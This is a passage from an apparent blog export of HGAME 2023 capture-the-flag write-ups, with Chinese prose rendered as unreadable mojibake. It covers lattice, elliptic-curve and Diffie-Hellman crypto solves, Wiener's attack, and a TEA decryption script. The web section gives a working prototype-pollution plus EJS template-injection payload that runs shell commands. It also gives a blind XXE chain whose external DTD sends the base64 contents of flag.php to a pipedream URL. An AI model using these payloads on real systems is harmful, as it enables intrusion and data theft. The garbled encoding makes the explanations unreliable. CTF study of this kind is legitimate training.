&amp; &amp; &amp; &amp; \\newline &amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline &amp; &amp; &amp; n &amp; &amp; &amp; \\newline A_0&amp;A_1&amp;\\dots &amp; A_{38}&amp;K/n&amp; &amp; \\newline B_0&amp;B_1&amp;\\dots &amp; B_{38}&amp; &amp; K &amp; \\newline \\end{bmatrix}=\\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \\newline &amp; n &amp; &amp; &amp; &amp; &amp; \\newline &amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline &amp; &amp; &amp; n &amp; &amp; &amp; \\newline s_0&amp;s_1&amp;\\dots &amp; s_{38}&amp;K/n&amp; &amp; \\newline -s_1&amp;-s_2&amp;\\dots &amp; -s_{39}&amp; &amp; K &amp; \\newline \\end{bmatrix}$ å…¶ä¸­ $K$ ä¸º $r_i$ çš„ä¸Šç•Œ $K=2^{340}$ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ª $M$ çš„æ•´ç³»æ•°çº¿æ€§ç»„åˆ $v$ï¼Œç”¨LLLç®—æ³•å¯ä»¥å¾—åˆ° $v_k$ã€‚ 1234567891011121314151617181920212223242526n = 2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081c = [...]t = 39A = []B = []for i in range(39): A.append(c[i]) B.append(-c[i+1])K = 2^340 X = n * identity_matrix(QQ, t)Z = matrix(QQ, [0] * t + [K/n] + [0]).transpose()Z2 = matrix(QQ, [0] * (t+1) + [K]).transpose()Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]])Y = block_matrix([[Y, Z, Z2]])Y = Y.LLL()k0 = ZZ(Y[1, 0] % n)flag = ZZ(Y[1, -2] / (K/n) % n)assert(k0 == (A[0]*flag + B[0]) % n)print(bytes.fromhex(hex(flag)[2:]))# b&#x27;hgame&#123;Repair_modulus_prob1em_5o_HNP_Revenge&#125;&#x27; â€‹ ECRSA å…”å…”æ‹œå¹´æ—¶é‡åˆ°äº†RSAï¼Œå¬è¯´RSAè¿˜æ²¡æœ‰å¦ä¸€åŠäºæ˜¯æŠŠECä»‹ç»ç»™äº†ä»–ã€‚ 12345678910111213141516171819202122232425262728from sage.all import *from sage.all_cmdline import *from Crypto.Util.number import *from secret import flagNbits = 512x = bytes_to_long(flag)f = open(&#x27;./output&#x27;, &#x27;w&#x27;)def gen_pubkey(Nbits): p = getPrime(Nbits // 2) q = getPrime(Nbits // 2) n = p*q while True: a = getRandomInteger(Nbits // 2) b = getRandomInteger(Nbits // 2) if gcd(4*a**3 + 27*b**2, n) == 1: break E = EllipticCurve(Zmod(n), [a, b]) e = getPrime(64) f.write(f&quot;p=&#123;p&#125;\\nq=&#123;q&#125;\\n&quot;) return n, E, en, E, e = gen_pubkey(Nbits)pt = E.lift_x(Integer(x))ct = pt * ef.write(f&quot;n = &#123;n&#125;\\na = &#123;E.a4()&#125;\\nb = &#123;E.a6()&#125;\\ne = &#123;e&#125;\\n&quot;)f.write(f&quot;ciphertext = &#123;long_to_bytes(int(ct.xy()[0]))&#125;\\n&quot;) ç»™å‡ºç‚¹ $C=eP$ çš„æ¨ªåæ ‡ï¼Œæ ¹æ®æ¤­åœ†æ›²çº¿æ€§è´¨ï¼Œç‚¹ $C$ ä¹Ÿåœ¨æ›²çº¿ä¸Šã€‚ å†åˆ©ç”¨ $e$ å¯¹ $\\#E(\\mathbb{F}_p) \\times \\#E(\\mathbb{F}_q)$ å–æ¨¡é€†å³å¯å¾—åˆ° $E(\\mathbb{Z}/n\\mathbb{Z})$ æ„ä¹‰ä¸‹çš„ $d$ï¼Œå†è§£å¯†æŒ‰ç…§RSAæ–¹å¼è§£å¯†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpy2p = 115192265954802311941399019598810724669437369433680905425676691661793518967453q = 109900879774346908739236130854229171067533592200824652124389936543716603840487n = 12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611a = 34573016245861396068378040882622992245754693028152290874131112955018884485688b = 103282137133820948206682036569671566996381438254897510344289164039717355513886e = 11415307674045871669ciphertext = b&#x27;f\\xb1\\xae\\x08`\\xe8\\xeb\\x14\\x8a\\x87\\xd6\\x18\\x82\\xaf1q\\xe4\\x84\\xf0\\x87\\xde\\xedF\\x99\\xe0\\xf7\\xdcH\\x9ai\\x04[\\x8b\\xbbHR\\xd6\\xa0\\xa2B\\x0e\\xd4\\xdbr\\xcc\\xad\\x1e\\xa6\\xba\\xad\\xe9L\\xde\\x94\\xa4\\xffKP\\xcc\\x00\\x907\\xf3\\xea&#x27;E = EllipticCurve(Zmod(n), [a, b])cx = int(ciphertext.hex(),16)Ep = E.change_ring(GF(p))Eq = E.change_ring(GF(q))d = inverse_mod(e, Ep.order() * Eq.order())print(d)cy2 = (cx^3 + a * cx + b) % nc = cy2e = 2P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f = a^e-cmps = f.monic().roots()P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g = a^e-cmqs = g.monic().roots()cy_all = []for mpp in mps: x = mpp[0] for mqq in mqs: y = mqq[0] cy_all.append(CRT_list([int(x), int(y)], [p, q])) for cy in cy_all: C = E(cx,cy) m, _ = (int(d)*C).xy() try: print(bytes.fromhex(hex(m)[2:])) except: pass # b&#x27;hgame&#123;ECC_4nd_RSA_also_can_be_combined&#125;&#x27; â€‹ WebShared Diary ek1ngç»™åä¼šæˆå‘˜å†™äº†ä¸€ä¸ªåœ¨çº¿å…±äº«æ—¥è®°æœ¬ï¼Œä¸è®ºæ˜¯è°åªè¦çŸ¥é“å¯†ç ï¼Œéƒ½å¯ä»¥åœ¨ä¸Šé¢è®°å½•è‡ªå·±çš„å°ç§˜å¯†ã€‚ä¸è¿‡å¥½åƒä»–çš„jså­¦çš„å¹¶ä¸å¥½å¯¼è‡´æ— æ„ä¸­å¼•å…¥äº†æ¼æ´ï¼Œçœ‹æ¥jsä¹Ÿæœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ã€‚ node.js Expressæ¡†æ¶ï¼Œapp.js ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const session = require(&#x27;express-session&#x27;);const randomize = require(&#x27;randomatic&#x27;);const ejs = require(&#x27;ejs&#x27;);const path = require(&#x27;path&#x27;);const app = express();function merge(target, source) &#123; for (let key in source) &#123; // Prevent prototype pollution if (key === &#x27;__proto__&#x27;) &#123; throw new Error(&quot;Detected Prototype Pollution&quot;) &#125; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;app .use(bodyParser.urlencoded(&#123;extended: true&#125;)) .use(bodyParser.json());app.set(&#x27;views&#x27;, path.join(__dirname, &quot;./views&quot;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.all(&quot;/login&quot;, (req, res) =&gt; &#123; if (req.method == &#x27;POST&#x27;) &#123; // save userinfo to session let data = &#123;&#125;; try &#123; merge(data, req.body) console.log(data); &#125; catch (e) &#123; return res.render(&quot;login&quot;, &#123;message: &quot;Don&#x27;t pollution my shared diary!&quot;&#125;) &#125; req.session.data = data console.log(req.session); // check password let user = &#123;&#125;; console.log(user); user.password = req.body.password; console.log(user); if (user.password=== &quot;testpassword&quot;) &#123; user.role = &#x27;admin&#x27; &#125; if (user.role === &#x27;admin&#x27;) &#123; req.session.role = &#x27;admin&#x27; return res.redirect(&#x27;/&#x27;) &#125;else &#123; return res.render(&quot;login&quot;, &#123;message: &quot;Login as admin or don&#x27;t touch my shared diary!&quot;&#125;) &#125; &#125; res.render(&#x27;login&#x27;, &#123;message: &quot;&quot;&#125;);&#125;);app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; if (!req.session.data || !req.session.data.username || req.session.role !== &#x27;admin&#x27;) &#123; return res.redirect(&quot;/login&quot;) &#125; if (req.method == &#x27;POST&#x27;) &#123; let diary = ejs.render(`&lt;div&gt;$&#123;req.body.diary&#125;&lt;/div&gt;`) req.session.diary = diary return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;); &#125; return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;);&#125;)app.listen(8888, &#x27;0.0.0.0&#x27;); å®¡è®¡æºç ï¼Œmerge() å‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œä½†ç¦ç”¨äº† __proto__ï¼Œåˆ©ç”¨ constructor.prototype ç»•è¿‡ã€‚ å°† user.role è®¾ç½®ä¸ºadminï¼Œç»•è¿‡æƒé™æ§åˆ¶åï¼Œè¿›å…¥ / è·¯ç”±ï¼Œè€Œ ejs.render() å­˜åœ¨SSTIæ¼æ´ï¼Œè®¾ç½® diary å€¼ä¸º &lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;) %&gt; å³å¯RCEã€‚ æ‰‹åŠ¨ä¿®æ”¹ Content-Type ä¸º application/jsonï¼ŒPOST payloadï¼š 12&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;password&quot;:&quot;ttt&quot;,&quot;diary&quot;:&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125; å¾—åˆ°flagï¼šhgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;ã€‚ â€‹ Tell Me Just tell me your thoughts æŸ¥çœ‹æºä»£ç æç¤º hint: ./www.zipï¼ŒæŸ¥çœ‹ send.phpï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php libxml_disable_entity_loader(false);if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123; $xmldata = file_get_contents(&quot;php://input&quot;); if (isset($xmldata))&#123; $dom = new DOMDocument(); try &#123; $dom-&gt;loadXML($xmldata, LIBXML_NOENT | LIBXML_DTDLOAD); &#125;catch(Exception $e)&#123; $result = &quot;loading xml data error&quot;; echo $result; return; &#125; $data = simplexml_import_dom($dom); if (!isset($data-&gt;name) || !isset($data-&gt;email) || !isset($data-&gt;content))&#123; $result = &quot;name,email,content cannot be empty&quot;; echo $result; return; &#125; if ($data-&gt;name &amp;&amp; $data-&gt;email &amp;&amp; $data-&gt;content)&#123; $result = &quot;Success! I will see it later&quot;; echo $result; return; &#125;else &#123; $result = &quot;Parse xml data error&quot;; echo $result; return; &#125; &#125;&#125;else &#123; die(&quot;Request Method Not Allowed&quot;);&#125;?&gt; ä½¿ç”¨ loadXML()+simplexml_import_dom() å‡½æ•°è§£æxmlæ•°æ®ï¼Œå­˜åœ¨XXEæ¼æ´ï¼Œä½†æ— å¯æ§åˆ¶çš„å›æ˜¾ä¿¡æ¯ï¼Œä½¿ç”¨å¤–å¸¦æ–¹å¼å¸¦å‡ºå‘½ä»¤æ‰§è¡Œç»“æœã€‚ åœ¨VPSæ–°å»º test.dtdï¼Œå†…å®¹ï¼š 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://eo3dgkbstljeu1v.m.pipedream.net?p=%file;&#x27;&gt;&quot;&gt; POSTæ•°æ®ï¼š 12345&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://VPS-IP/test.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;user&gt;&lt;name&gt;s&lt;/name&gt;&lt;email&gt;d&lt;/email&gt;&lt;content&gt;sss&lt;/content&gt;&lt;/user&gt; åœ¨pipedreamå¾—åˆ°å›æ˜¾ï¼š https://eo3dgkbstljeu1v.m.pipedream.net?p=PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg== base64è§£ç å¾— flag.php å†…å®¹ï¼š 123&lt;?php $flag1 = &quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;;?&gt; â€‹ Reverseshellcode å…”å…”çš„ç”µè„‘ä¸å°å¿ƒä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æŠŠä»–å†™çš„è®ºæ–‡ç»™åŠ å¯†äº†ï¼Œä½ èƒ½å¸®å…”å…”æ¢å¤å—ï¼Ÿ Goç¨‹åºï¼Œåœ¨ main_main() ä¸­æŸ¥çœ‹ä»£ç é€»è¾‘ï¼Œç»“åˆé¢˜ç›®ï¼Œå…¶ä¸­ä¸€ä¸ªé•¿base64ç¼–ç å­—ç¬¦ä¸²å¯èƒ½ä¸ºè°ƒç”¨çš„shellcodeå­—ç¬¦ä¸²ã€‚ æå–å‡ºæ¥ï¼š VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D è§£ç åä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä½¿ç”¨IDAæŸ¥çœ‹ï¼Œè¯†åˆ«ä¸ºå‡½æ•°ï¼š 12345678910111213141516171819202122_DWORD *__fastcall sub_1(unsigned int *a1)&#123; _DWORD *result; // rax unsigned int v2; // [rsp+20h] [rbp+0h] unsigned int v3; // [rsp+24h] [rbp+4h] int v4; // [rsp+28h] [rbp+8h] unsigned int i; // [rsp+40h] [rbp+20h] v2 = *a1; v3 = a1[1]; v4 = 0; for ( i = 0; i &lt; 0x20; ++i ) &#123; v4 += 0xABCDEF23; v2 += ((v3 &gt;&gt; 5) + 33) ^ (v3 + v4) ^ (16 * v3 + 22); v3 += ((v2 &gt;&gt; 5) + 55) ^ (v2 + v4) ^ (16 * v2 + 44); &#125; *a1 = v2; result = a1 + 1; a1[1] = v3; return result;&#125; æ˜“çŸ¥ä»£ç ä¸ºé­”æ”¹äº†Deltaå€¼çš„TEAåŠ å¯†ç®—æ³•ï¼Œè§£å¯†ï¼š 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xABCDEF23 * 32 delta = 0xABCDEF23 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vf = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()c = [bytes_to_long(f[4*i:4*(i+1)][::-1]) for i in range(len(f)//4)]print(c)key = [22, 33, 44, 55]flag = b&#x27;&#x27;for i in range(len(c)//2): d = decrypt(c[2*i:2*(i+1)], key) flag += long_to_bytes(d[0])[::-1] + long_to_bytes(d[1])[::-1]print(flag) # b&quot;hgame&#123;th1s_1s_th3_tutu&#x27;s_h0mew0rk&#125;\\x00&quot;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 3","slug":"match-HGAME-2023-Week-3","date":"2023-01-30T09:25:16.000Z","updated":"2023-01-30T06:01:55.753Z","comments":true,"path":"2023/01/30/match-HGAME-2023-Week-3/","permalink":"https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/","excerpt":"","text":"â€‹ HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps://hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3åï¼š600Pwnhubé‡‘å¸4-10åï¼š300Pwnhubé‡‘å¸è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ªæ³¨æ„ï¼š* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰ Rank: 7 â€‹ MiscTunnel Just a very very very safe tunnel. HINTS: ç”±äºé™„ä»¶æœ‰é—®é¢˜åˆ†æ•°ä¸‹è°ƒè‡³50åˆ† 16è¿›åˆ¶æŸ¥çœ‹å™¨ï¼Œæœç´¢ hgame ï¼Œæœ‰ hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;ã€‚ â€‹ CryptoezDH è¿™å¤§è¿‡å¹´çš„ï¼ŒBobç»™Aliceå‘äº†ä»€ä¹ˆæ¶ˆæ¯å‘¢ 12345678910111213141516171819202122232425262728293031from sage.all import *from Crypto.Util.number import *from secret import Alice_secret, Bob_secret, FLAGimport randomf = open(&#x27;output&#x27;, &#x27;w&#x27;)N=0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2A = power_mod(g, Alice_secret, N)f.write(&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\\n&quot;.format(g=g, A=hex(A)))B = power_mod(g, Bob_secret, N)f.write(&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\\n&quot;.format(B=hex(B)))shared_secret = pow(A, Bob_secret, N)p=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a=-3b=1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = E.random_point()Pa = shared_secret * Gf.write(f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: &#123;E&#125;, &#x27;G&#x27;: &#123;G.xy()&#125;, &#x27;Pa&#x27;: &#123;Pa.xy()&#125; &#125;&#125;\\n&quot;)k = random.randint(2, p)m = E.lift_x(Integer(bytes_to_long(FLAG)))P1 = k * GP2 = k * Pac = m + P2f.write(f&quot;Bob send to Alice: &#123;&#123; &#123;P1.xy()&#125;, &#123;c.xy()&#125; &#125;&#125;\\n&quot;) $N$ ä¸ºè´¨æ•°ï¼Œ$N-1$ è¶³å¤Ÿå…‰æ»‘ï¼ŒDLPæ˜“æ±‚ï¼Œå†åˆ©ç”¨ $c=m+P_2=m+kP_a=m+ksG=m+sP_1$ï¼Œä»£å…¥ $c,s,P_1$ æ±‚å¾— $m$ã€‚ 123456789101112131415161718192021N = 0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2A = 0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833B = 0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510ddeb = discrete_log(mod(B,N),mod(g,N))s = pow(A,b,N)p = 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a = -3b = 1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = E(6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915, 3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206)Pa = E(2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698, 1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773)P1 = E(2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647, 3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868)c = E(6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522, 6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395)m = c - s*P1print(bytes.fromhex(hex(m[0])[2:]))# b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27; â€‹ RSA å¤§å†’é™©2 å¥½è€¶ï¼Œåˆæ˜¯å¤§å†’é™©ï¼ HINTS: Challenge 3: pæ³„æ¼çš„ä½æ•°ä¸å¤Ÿå¤šï¼Œå¯¼è‡´coppersmithæ–¹æ³•è§£ä¸å‡ºæ¥ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿæ‰©å¤§coppersmithçš„ç•Œå‘¢ï¼Ÿæ³¨æ„coppersmithæ–¹æ³•ä½¿ç”¨äº†LLLç®—æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç•Œå’Œæ ¼åŸºåˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ 123456789101112131415161718192021222324252627282930313233343536373839# challenge1.pyfrom Crypto.Util.number import *from math import isqrtfrom challenges import chall1_secretclass RSAServe: def __init__(self) -&gt; None: def create_keypair(size): while True: p = getPrime(size // 2) q = getPrime(size // 2) if q &lt; p &lt; 2*q: break N = p*q phi = (p-1)*(q-1) max_d = isqrt(isqrt(N)) // 3 max_d_bits = max_d.bit_length() - 1 while True: d = getRandomNBitInteger(max_d_bits) try: e = int(inverse(d, phi)) except ZeroDivisionError: continue if (e * d) % phi == 1: break return N, e, d self.N, self.e, self.d = create_keypair(1024) self.m = chall1_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_ ,self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e&#125; 12345678910111213141516171819202122232425262728293031323334353637# challenge2.pyfrom Crypto.Util.number import *from challenges import chall2_secretdef next_prime(p): k=1 while True: if isPrime(p+k): return p+k k+=1class RSAServe: def __init__(self) -&gt; None: def creat_keypair(nbits, beta): p = getPrime(nbits // 2) q = next_prime(p+getRandomNBitInteger(int(nbits*beta))) N = p*q phi = (p-1)*(q-1) while True: e = getRandomNBitInteger(16) if GCD(e, phi) == 2: break d = inverse(e, phi) return N, e, d self.N, self.e, self.d = creat_keypair(1024, 0.25) self.m = chall2_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e&#125; 12345678910111213141516171819202122232425262728# challenge3.pyfrom Crypto.Util.number import *from challenges import chall3_secretclass RSAServe: def __init__(self) -&gt; None: def create_keypair(nbits): p = getPrime(nbits // 2) q = getPrime(nbits // 2) N = p*q phi = (p-1)*(q-1) e = 65537 d = inverse(e, phi) leak = p &gt;&gt; 253 return N, e, d, leak self.N, self.e, self.d, self.leak = create_keypair(1024) self.m = chall3_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e, &quot;leak&quot;:self.leak&#125; æ±‚è§£ä¸‰å±‚RSAæ‹¿flagã€‚ ç¬¬ä¸€å±‚ï¼Œ$q&lt;p&lt;2q,d&lt;\\cfrac{1}{3}N^{\\frac{1}{4}}$ï¼Œæ»¡è¶³Wiener Attackæ¡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233def factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p)N = 137549711547277501490512652253223705009896739033213206450427185227633740625388392382604507796908923883409603222056205390907355567345203551544782114279172864959402320300753748333020687530365352630647687557310169459736318329569719516536939612675375837585785285970788429934265825996569888095986259096503876786157e = 93353589564181636718027173778502268418513041301835540045681119331234573983360292187550959060357949657609295815897069024673722589144338487101058734688906424145037973559780521703111302989561973563657725186914522917495401111500951519775376691911667795239110869653121682582184013495282531768528802139272651917441c = 0x24e544c4b398ed0812a1739127c026d2b8eeba2b1e5c9221a6debaa9ebfeb134c6dfcbcf3142ec2723b6990d25d4bb0d7f14e4034c4a8be71d46015e6ae65cc8e1872f62860e5b89cd59f48420e9a3e85dcbdf34c850688046026fcf4ffb504baef704ff049f49494bbfb05624a30c542051fada959dff52fefc378489e20c60p, q = factor_rsa_wiener(N, e)f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,N)print(bytes.fromhex(hex(m)[2:]))# b&#x27;wiener_attack_easily!!!&#x27; ç¬¬äºŒå±‚ï¼Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»+ 